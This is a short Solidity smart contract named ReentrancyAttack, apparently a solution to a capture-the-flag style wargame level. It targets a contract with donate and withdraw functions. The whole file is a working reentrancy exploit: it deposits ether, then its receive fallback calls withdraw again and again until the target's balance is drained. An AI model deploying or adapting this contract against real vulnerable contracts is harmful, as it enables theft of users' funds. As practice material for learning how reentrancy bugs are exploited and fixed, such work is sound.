// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

interface IReentrance {
    function withdraw(uint256 amount) external;

    function donate(address to) external payable;
}

contract ReentrancyAttack {
    IReentrance public reentrance;
    uint256 public initialDeposit;

    constructor(address reentranceAddress) {
        reentrance = IReentrance(reentranceAddress);
    }

    function attack() external payable {
        initialDeposit = msg.value;
        reentrance.donate{ value: initialDeposit }(address(this));
        withdraw();
    }

    receive() external payable {
        withdraw();
    }

    function withdraw() private {
        uint256 balance = address(reentrance).balance;

        if (balance > 0) {
            reentrance.withdraw(initialDeposit < balance ? initialDeposit : balance);
        }
    }
}
